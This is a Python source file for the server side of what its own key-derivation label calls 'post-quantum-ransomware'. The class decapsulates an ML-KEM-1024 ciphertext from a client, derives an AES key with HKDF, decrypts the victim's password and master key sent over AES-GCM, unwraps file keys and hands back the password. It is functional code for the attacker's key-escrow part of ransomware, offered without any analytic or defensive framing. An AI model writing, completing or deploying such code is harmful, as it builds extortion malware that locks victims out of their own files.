from cryptography.hazmat.primitives.keywrap import aes_key_unwrap
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from pqcrypto.kem.ml_kem_1024 import decrypt


class Server:
    kem_secret_key: bytes
    communication_key: bytes
    client_password: str
    client_master_key: bytes

    def __init__(self, kem_secret_key):
        self.kem_secret_key = kem_secret_key

    def establish_shared_secret(self, ciphertext: bytes) -> bytes:
        """
        Establish a shared secret with the client using ML-KEM.

        :param self: The Server instance.
        :param ciphertext: The ciphertext received from the client.
        :return: The recovered plaintext shared secret.
        :rtype: bytes
        """

        plaintext_recovered = decrypt(self.kem_secret_key, ciphertext)
        self.shared_secret = plaintext_recovered

        return plaintext_recovered

    def derive_shared_secret(self, shared_secret: bytes):
        """
        Derive a communication key from the shared secret.

        :param self: The Server instance.
        :param shared_secret: The shared secret established with the client.
        :return: None
        """

        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b"post-quantum-ransomware communication key",
        )

        self.communication_key = hkdf.derive(shared_secret)

    def get_client_info(self, encrypted_password: dict, encrypted_master_key: dict):
        """
        Decrypt the client's password and master key using the server's private key.

        :param self: The Server instance.
        :param encrypted_password: The encrypted password received from the client.
        :param encrypted_master_key: The encrypted master key received from the client.
        :return: None
        """

        # Decrypt the client's password
        decryptor = Cipher(
            algorithms.AES(self.communication_key),
            modes.GCM(encrypted_password["iv"], encrypted_password["tag"]),
        ).decryptor()
        self.client_password = (
            decryptor.update(encrypted_password["ciphertext"]) + decryptor.finalize()
        ).decode()

        # Decrypt the client's master key
        decryptor = Cipher(
            algorithms.AES(self.communication_key),
            modes.GCM(encrypted_master_key["iv"], encrypted_master_key["tag"]),
        ).decryptor()
        self.client_master_key = (
            decryptor.update(encrypted_master_key["ciphertext"]) + decryptor.finalize()
        )

    def unwrap_file_key(self, wrapped_file_key: bytes) -> bytes:
        """
        Decrypt the file key using the client's master key.

        :param self: The Server instance.
        :param wrapped_file_key: The wrapped file key to decrypt.
        :return: The decrypted file key.
        :rtype: bytes
        """

        file_key = aes_key_unwrap(self.client_master_key, wrapped_file_key)

        return file_key

    def send_password(self) -> str:
        """
        Return the client's password.

        :param self: The Server instance.
        :return: The client's password as a string.
        :rtype: str
        """

        return self.client_password
